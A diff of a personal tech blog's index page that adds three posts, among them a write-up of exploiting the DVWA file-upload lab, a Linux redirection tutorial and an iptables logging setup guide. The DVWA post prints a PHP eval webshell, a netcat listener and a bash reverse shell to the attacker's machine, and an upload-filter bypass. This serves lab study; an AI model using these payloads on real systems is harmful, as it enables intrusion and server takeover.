@@ -80,7 +80,7 @@
 </a>-->
       <!--
   <div class="article-category-index">
-    <a class="article-category-index-link" href="/categories/GitHub-Page/">GitHub_Page</a>
+    <a class="article-category-index-link" href="/categories/GitHub-Page/">GitHub-Page</a>
   </div>
 
 -->
@@ -145,7 +145,7 @@
 </a>-->
       <!--
   <div class="article-category-index">
-    <a class="article-category-index-link" href="/categories/GitHub-Page/">GitHub_Page</a>
+    <a class="article-category-index-link" href="/categories/GitHub-Page/">GitHub-Page</a>
   </div>
 
 -->
@@ -221,7 +221,7 @@
 </a>-->
       <!--
   <div class="article-category-index">
-    <a class="article-category-index-link" href="/categories/GitHub-Page/">GitHub_Page</a>
+    <a class="article-category-index-link" href="/categories/GitHub-Page/">GitHub-Page</a>
   </div>
 
 -->
@@ -307,7 +307,7 @@
 </a>-->
       <!--
   <div class="article-category-index">
-    <a class="article-category-index-link" href="/categories/GitHub-Page/">GitHub_Page</a>
+    <a class="article-category-index-link" href="/categories/GitHub-Page/">GitHub-Page</a>
   </div>
 
 -->
@@ -331,6 +331,483 @@
 <h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://hexo.io/zh-tw/docs/">Hexo 官網</a><br><a target="_blank" rel="noopener" href="https://nodejs.org/en/download/">Node.js 官網</a><br><a target="_blank" rel="noopener" href="https://medium.com/%E9%80%B2%E6%93%8A%E7%9A%84-git-git-git/%E5%BE%9E%E9%9B%B6%E9%96%8B%E5%A7%8B-%E7%94%A8github-pages-%E4%B8%8A%E5%82%B3%E9%9D%9C%E6%85%8B%E7%B6%B2%E7%AB%99-fa2ae83e6276">從零開始: 用github pages 上傳靜態網站</a></p>
 <hr>
 <h6 id="tags-部落格-Hexo-GitHub-Page-紀錄"><a href="#tags-部落格-Hexo-GitHub-Page-紀錄" class="headerlink" title="tags: 部落格 Hexo GitHub Page 紀錄"></a>tags: <code>部落格</code> <code>Hexo</code> <code>GitHub Page</code> <code>紀錄</code></h6>
+      
+    </div>
+	
+    <!--
+	
+    -->
+    <!--
+    
+      <footer class="article-footer">
+      </footer>
+    
+    -->
+  </div>
+  
+</article>
+
+
+
+    
+      <article id="post-DWVA-file-upload-Privilege-Escalation" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <myh11 itemprop="name">
+      <a class="article-title-index" href="/2019/08/29/DWVA-file-upload-Privilege-Escalation/"><strong>DWVA file upload Privilege Escalation</strong></a>
+      <small class=article-date-index>&nbsp; 2019-08-29</small>
+      <!--<a>
+      <div = post.date  </div>
+      </a>-->
+      <br>
+      <br> <!-- blair add -->
+    </myh11>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      <!--<a href="/2019/08/29/DWVA-file-upload-Privilege-Escalation/" class="article-date">
+  <time datetime="2019-08-29T09:42:51.000Z" itemprop="datePublished">2019-08-29</time>
+</a>-->
+      <!--
+  <div class="article-category-index">
+    <a class="article-category-index-link" href="/categories/Security/">Security</a>
+  </div>
+
+-->
+      <!--
+      
+      -->
+    </div>
+	
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><p>victim：CentOS 7.6 with DVWA（IP：192.168.0.250）<br>attacker：macOS Mojave（IP：192.168.0.1），Kali Linux（IP：192.168.0.128） </p>
+<p>victim無配置iptables rules.</p>
+<h2 id="Security-Level-Low"><a href="#Security-Level-Low" class="headerlink" title="Security Level:Low"></a>Security Level:Low</h2><p>在Security Level為Low時，file upload可上傳任何檔案，因此上傳包含<em>一句話木馬</em>的php檔至伺服器。</p>
+<p>Security Level = low，source code</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; </span><br><span class="line">    // Where are we going to be writing to? </span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; </span><br><span class="line">    $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); </span><br><span class="line"></span><br><span class="line">    // Can we move the file to the upload folder? </span><br><span class="line">    if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123; </span><br><span class="line">        // No </span><br><span class="line">        echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // Yes! </span><br><span class="line">        echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>in Hack.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/WO8NmPT.png"><br>*一句話木馬詳細原理待補充</p>
+<h2 id="Altman"><a href="#Altman" class="headerlink" title="Altman"></a>Altman</h2><p>Altman為一跨平台webshell程式，可在macOS、Linux、Windows等系統上執行使用。<br>於畫面點選右鍵新增webshell，依序填入webshell別名、木馬執行方式、URL、一句話木馬中的字串。<br><img src="https://i.imgur.com/QTSj0gT.png"><br>右鍵點選可執行檔案總管、shell指令畫面等。<br><img src="https://i.imgur.com/qkUQgFH.png"><br>在此選擇shellCmder，驗證當前使用者，為<code>apache</code>。<br><img src="https://i.imgur.com/ZtXzi8m.png"><br>但在此並無法將使用者切換為root以及執行其他大部分程式（為低權限模式）。<br>而我們需要在victim上製作一個反彈shell，使得我們以<strong>interactive shell</strong>的方式與victim進行互動。<br>先在Kali Linux上開啟port 2333等待victim連接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333    #此套件為netcat</span><br><span class="line">listening on [any] 2333</span><br></pre></td></tr></table></figure>
+
+<p>在Altman下指令連接至Kali Linux以port 2333進行連接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.0.128/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>在Kali Linux的Terminal可以發現連線成功並以interactive shell，而可以直接切換至root。<br><img src="https://i.imgur.com/hkILVZF.png"></p>
+<h2 id="Security-Level：Medium"><a href="#Security-Level：Medium" class="headerlink" title="Security Level：Medium"></a>Security Level：Medium</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; </span><br><span class="line">    // Where are we going to be writing to? </span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; </span><br><span class="line">    $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); </span><br><span class="line"></span><br><span class="line">    // File information </span><br><span class="line">    $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ]; </span><br><span class="line">    $uploaded_type = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;type&#x27; ]; </span><br><span class="line">    $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ]; </span><br><span class="line"></span><br><span class="line">    // Is it an image? </span><br><span class="line">    if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; </span><br><span class="line">        ( $uploaded_size &lt; 100000 ) ) &#123; </span><br><span class="line"></span><br><span class="line">        // Can we move the file to the upload folder? </span><br><span class="line">        if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123; </span><br><span class="line">            // No </span><br><span class="line">            echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            // Yes! </span><br><span class="line">            echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // Invalid file </span><br><span class="line">        echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>從Source code發現，此層級只允許上傳jpg以及png類型的檔案，並且大小為100KB以下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">因此須將一句話木馬以jpg/png為副檔名來上傳，再使用Burp Suite擷取封包並且從中更改副檔名。Burp Suite以proxy的方式進行運作，所以瀏覽器需要設定proxy，預設port為8080。</span><br><span class="line"></span><br><span class="line">![](https://i.imgur.com/DuimiM8.png)</span><br><span class="line"></span><br><span class="line">將intercept切換為on，使Burp Suite接收封包。</span><br><span class="line"></span><br><span class="line">![](https://i.imgur.com/B6ZkGTp.png)</span><br><span class="line"></span><br><span class="line">在Content-Disposition中，將```filename=&quot;hack-medium.php&quot;```更改為```filename=&quot;hack-medium.png&quot;```，如此伺服器接收到的仍是PNG類型，但實際存放時的檔案類型為php。</span><br><span class="line">之後執行webshell以及提權方法皆與security level=low時一樣。</span><br><span class="line"></span><br><span class="line">## Security Level：High</span><br><span class="line">```&lt;?php </span><br><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; </span><br><span class="line">    // Where are we going to be writing to? </span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; </span><br><span class="line">    $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); </span><br><span class="line"></span><br><span class="line">    // File information </span><br><span class="line">    $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ]; </span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1); </span><br><span class="line">    $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ]; </span><br><span class="line">    $uploaded_tmp  = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ]; </span><br><span class="line"></span><br><span class="line">    // Is it an image? </span><br><span class="line">    if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; 100000 ) &amp;&amp; </span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123; </span><br><span class="line"></span><br><span class="line">        // Can we move the file to the upload folder? </span><br><span class="line">        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; </span><br><span class="line">            // No </span><br><span class="line">            echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            // Yes! </span><br><span class="line">            echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // Invalid file </span><br><span class="line">        echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p><code>strrpos()</code>函數為尋找指定字串最後出現的位置。</p>
+<p><code>substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1);</code>首先取得<code>&#39;.&#39;</code>最後出現的位置後再+1，以此數值使用<code>substr</code>函數取得該位置起始的字串。<br>也就是說<code>$uploaded_ext</code>會是一個為副檔名的字串（like ‘jpg’）。</p>
+<p><code>getimagesize()</code>此函數將取得圖像的大小與相關訊息。<br>Example：<br><code>Array ( [0] =&gt; 105 [1] =&gt; 60 [2] =&gt; 3 [3] =&gt; width=&quot;105&quot; height=&quot;60&quot; [bits] =&gt; 8 [mime] =&gt; image/png )</code></p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2549">Linux 反弹shell（二）反弹shell的本质</a><br><a target="_blank" rel="noopener" href="https://legoc.github.io/2018/09/20/Linux%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF/">Linux提权思路+实战</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/188852.html">记一次曲折的Linux提权</a></p>
+
+      
+    </div>
+	
+    <!--
+	
+    -->
+    <!--
+    
+      <footer class="article-footer">
+      </footer>
+    
+    -->
+  </div>
+  
+</article>
+
+
+
+    
+      <article id="post-Linux-Programming-I-O-Redirection、Pipeline" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <myh11 itemprop="name">
+      <a class="article-title-index" href="/2019/08/26/Linux-Programming-I-O-Redirection%E3%80%81Pipeline/"><strong>Linux Programming I/O Redirection、Pipeline</strong></a>
+      <small class=article-date-index>&nbsp; 2019-08-26</small>
+      <!--<a>
+      <div = post.date  </div>
+      </a>-->
+      <br>
+      <br> <!-- blair add -->
+    </myh11>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      <!--<a href="/2019/08/26/Linux-Programming-I-O-Redirection%E3%80%81Pipeline/" class="article-date">
+  <time datetime="2019-08-26T09:38:48.000Z" itemprop="datePublished">2019-08-26</time>
+</a>-->
+      <!--
+  <div class="article-category-index">
+    <a class="article-category-index-link" href="/categories/Linux/">Linux</a>
+  </div>
+
+-->
+      <!--
+      
+      -->
+    </div>
+	
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="輸入、輸出、重新導向"><a href="#輸入、輸出、重新導向" class="headerlink" title="輸入、輸出、重新導向"></a>輸入、輸出、重新導向</h2><p>標準輸入（STDIN）：代碼表示0，程式執行時所需要的輸入資料。<br>標準輸出（STDOUT）：代碼表示1，程式”正常“執行時所產生的輸出資料。<br>標準錯誤輸出（STDERR）：代碼表示2，程式”錯誤“執行時輸出的訊息。<br>重新導向：改變資料的輸出入方向。</p>
+<p><img src="https://i.imgur.com/CmJfEx1.jpg"><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/chenchen410/article/details/39138437">Image source：Piping and Redirection,output，Reading from STDIN in script(Linux)</a></p>
+<h2 id="標準輸出-STDOUT"><a href="#標準輸出-STDOUT" class="headerlink" title="標準輸出 STDOUT"></a>標準輸出 STDOUT</h2><p>一般的程式執行結果會顯示在螢幕上，也就是說預設的標準輸出是螢幕。我們可以使用 <code> &gt;</code> 來將標準輸出導向至檔案。<br>語法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">N &gt; FILE</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Example：將 ```ls -al``` 輸出內容導向至ls.txt</span><br></pre></td></tr></table></figure>
+<p>ls -al &gt; ls.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">若當前資料夾中``` ls.txt ```檔案不存在，則為自動生成一個並寫入。</span><br><span class="line">若此檔案存在，則會清除原始內容並寫入```ls -al```輸出資料。</span><br><span class="line">若想要保留原始資料並將輸出內容接續檔案原內容，則可以使用```&gt;&gt;```替換原本的```&gt;```。</span><br><span class="line">Example：</span><br></pre></td></tr></table></figure>
+<p>ls -al &gt;&gt; ls.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 標準錯誤輸出 STDERR</span><br><span class="line">程式發生錯誤時，錯誤訊息預設也是輸出在螢幕上。</span><br><span class="line">Example：</span><br></pre></td></tr></table></figure>
+<p>ls no_file.txt<br>ls: cannot access no_file.txt: No such file or directory</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">若想要將錯誤訊息輸出至```ls.txt```內，如果下這行command：</span><br></pre></td></tr></table></figure>
+<p>ls no_file.txt &gt; ls.txt<br>ls: cannot access no_file.txt: No such file or directory</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">錯誤訊息依然顯示在螢幕，而```ls.txt```也不會寫入錯誤訊息。原因是```&gt;```預設代碼為```1```，此時我們要指定代碼為```2```，也就是指定將輸出錯誤訊息寫入```ls.txt```內。</span><br></pre></td></tr></table></figure>
+<p>ls no_file.txt 2&gt; ls.txt<br>cat ls.txt<br>ls: cannot access no_file.txt: No such file or directory</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">若想將標準輸出與標準錯誤輸出的資料一起寫入同個檔案可以這樣寫：</span><br></pre></td></tr></table></figure>
+<p>ls no_file.txt &gt; ls.txt 2&gt;&amp;1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">```2&gt;&amp;1```代表將**標準錯誤輸出**的資料導入**標準輸出**</span><br><span class="line">不要忘記```&gt;```預設為**正常輸出**。</span><br><span class="line">驗證：</span><br></pre></td></tr></table></figure>
+<p>ls no_file.txt &gt; ls.txt 2&gt;&amp;1<br>cat ls.txt<br>ls: cannot access no_file.txt: No such file or directory<br>touch no_file.txt<br>ls no_file.txt &gt; ls.txt 2&gt;&amp;1<br>cat ls.txt<br>no_file.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原先無```no_file.txt```此檔案，執行```ls```並將錯誤訊息寫入```ls.txt```，新增```no_file.txt```並再一次執行```ls```，可以看到輸出訊息有所變化且正常輸出與錯誤輸出資料都寫入```ls.txt```內。</span><br><span class="line"></span><br><span class="line">導向語法有許多組合，以下都可以達到將正常輸出與錯誤輸出寫入同一個檔案內。</span><br><span class="line">Example：</span><br></pre></td></tr></table></figure>
+<p>ls no_file.txt 2&gt; ls.txt 1&gt;&amp;2<br>ls no_file.txt &gt;&amp; ls.txt<br>ls no_file.txt &amp;&gt; ls.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```&gt;&amp;``` ```&amp;&gt;```為將所有輸出導向至檔案。</span><br><span class="line">實用例子：儲存iptables規則至檔案</span><br></pre></td></tr></table></figure>
+<p>iptables-save &gt; iptables.rule</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 標準輸入</span><br><span class="line">需要輸入資料的Linux程式若執行時沒有給予資料的話，預設將會從鍵盤讀取資料</span><br><span class="line">Example：</span><br></pre></td></tr></table></figure>
+<p>cat<br>1<br>1<br>2<br>2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用```&lt;```，將指定的檔案設定為程式的標準輸入</span><br><span class="line">Example：</span><br></pre></td></tr></table></figure>
+<p>cat &lt; ls.txt<br>no_file.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 管線 pipe</span><br><span class="line">若要把兩個或以上的程式輸入出串連起來，可以使用```|```（pipe）。</span><br><span class="line">![](https://i.imgur.com/sN2gQjM.png)</span><br><span class="line">[Image Soruce：鳥哥的 Linux 私房菜 第十章、認識與學習BASH](http://linux.vbird.org/linux_basic/0320bash.php)</span><br><span class="line"></span><br><span class="line">Example：</span><br></pre></td></tr></table></figure>
+<p>ls | nl</p>
+<p>1 file1<br>2 file2<br>3 directory3</p>
+<p>```</p>
+<p><code>nl</code>為顯示行數的指令。<br>也就是 <code>ls</code>的輸出透過pipe成為了<code>nl</code>的輸入，達到了可顯示行數的<code>ls</code>功能。</p>
+<h2 id="dev-null"><a href="#dev-null" class="headerlink" title="/dev/null"></a>/dev/null</h2><p>-<br>一個類似垃圾桶的東西，若將輸出指向至此，則所有輸出將會被捨棄掉。</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://blog.gtwang.org/linux/linux-io-input-output-redirection-operators/">GTW-Linux I/O 輸入與輸出重新導向，基礎概念教學</a></p>
+
+      
+    </div>
+	
+    <!--
+	
+    -->
+    <!--
+    
+      <footer class="article-footer">
+      </footer>
+    
+    -->
+  </div>
+  
+</article>
+
+
+
+    
+      <article id="post-Transport-iptables-log-file-to-log-server" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <myh11 itemprop="name">
+      <a class="article-title-index" href="/2019/08/15/Transport-iptables-log-file-to-log-server/"><strong>Transport iptables log file to log server</strong></a>
+      <small class=article-date-index>&nbsp; 2019-08-15</small>
+      <!--<a>
+      <div = post.date  </div>
+      </a>-->
+      <br>
+      <br> <!-- blair add -->
+    </myh11>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      <!--<a href="/2019/08/15/Transport-iptables-log-file-to-log-server/" class="article-date">
+  <time datetime="2019-08-15T08:12:20.000Z" itemprop="datePublished">2019-08-15</time>
+</a>-->
+      <!--
+  <div class="article-category-index">
+    <a class="article-category-index-link" href="/categories/%E6%9C%8D%E5%8B%99%E5%BB%BA%E7%BD%AE/">服務建置</a>
+  </div>
+
+-->
+      <!--
+      
+      -->
+    </div>
+	
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Objective"><a href="#Objective" class="headerlink" title="Objective"></a>Objective</h2><p>Setting iptables log function in log client,and transport log file to log server.<br>Deploy LogAnalyzer on log server.</p>
+<h2 id="System-environment"><a href="#System-environment" class="headerlink" title="System environment"></a>System environment</h2><p>All System use CentOS 7.6</p>
+<ol>
+<li>R1(Network Adapter *2)</li>
+<li>log server (in LAN)</li>
+</ol>
+<h2 id="Build-iptables-rules-and-rsyslog-in-R1"><a href="#Build-iptables-rules-and-rsyslog-in-R1" class="headerlink" title="Build iptables rules and rsyslog in R1"></a>Build iptables rules and rsyslog in R1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -i $LAN_INTERFACE -j LOG --log-prefix &quot;INPUT ICMPv4:&quot; --log-level notice</span><br><span class="line">iptables -A INPUT -p tcp -j LOG --log-prefix &quot;INPUT TCP:&quot; --log-level notice</span><br><span class="line">iptables -A INPUT -p udp -j LOG --log-prefix &quot;INPUT UDP:&quot; --log-level notice</span><br><span class="line">iptables -t nat -A POSTROUTING -o ens33 -J LOG --log-level notice --log-prefix &quot;NAT Packet:&quot;</span><br><span class="line">iptables -t nat -A POSTROUTING -o ens33 -J MASQUERADE</span><br></pre></td></tr></table></figure>
+<p>Save log file in /var/log/iptables.log<br>edit /etc/rsyslog.conf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*.* @192.168.0.1:514  //log server ip or FQDN and be a log client</span><br></pre></td></tr></table></figure>
+
+<p>enable ipv4.ip_forward in sysctl.conf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.ipv4.ip_forward = 1</span><br></pre></td></tr></table></figure>
+
+<h2 id="Build-rsyslog-in-log-server"><a href="#Build-rsyslog-in-log-server" class="headerlink" title="Build rsyslog in log server"></a>Build rsyslog in log server</h2><p>edit /etc/rsyslog.conf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#uncommend these lines</span><br><span class="line">$ModLoad imudp</span><br><span class="line">$UDPServerRun 514</span><br><span class="line"></span><br><span class="line">#add these line to allow log client</span><br><span class="line">$AllowedSender UDP,192.168.0.0/24</span><br><span class="line">kern.=notice /var/log/iptables.log  #Save log in file</span><br><span class="line"></span><br><span class="line">*.info;*.!notice;mail.none;authpriv.none;cron.none;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Deploy-LogAnalyzer-in-log-server"><a href="#Deploy-LogAnalyzer-in-log-server" class="headerlink" title="Deploy LogAnalyzer in log server"></a>Deploy LogAnalyzer in log server</h2><p>Install apache2 and php<br>(In this project,php version is 7.3,and defalut version in CentOS 7 is 5.4)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install httpd php</span><br></pre></td></tr></table></figure>
+<p>Recommand：Reboot the computer after finishing install or LogAnalyzer will not install successfully.</p>
+<p>Download LogAnalyzer from official website and extract it</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.adiscon.com/loganalyzer/loganalyzer-4.1.7.tar.gz</span><br><span class="line">tar -zxvf loganalyzer-4.1.7.tar.gz</span><br></pre></td></tr></table></figure>
+<p>To show report-images in LogAnalyzer,need to install GD module.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install gd gd-devel php-gd</span><br><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure>
+
+<p>Browse $YOUR_SERVER_IP/loganalyzer/src/install.php to install LogAnalyzer.</p>
+<h2 id="Use-MariaDB-MySQL-to-store-log-files-and-use-phpMyAdmin-to-manage"><a href="#Use-MariaDB-MySQL-to-store-log-files-and-use-phpMyAdmin-to-manage" class="headerlink" title="Use MariaDB(MySQL) to store log files , and use phpMyAdmin to manage."></a>Use MariaDB(MySQL) to store log files , and use phpMyAdmin to manage.</h2><p>Install MariaDB and configure</p>
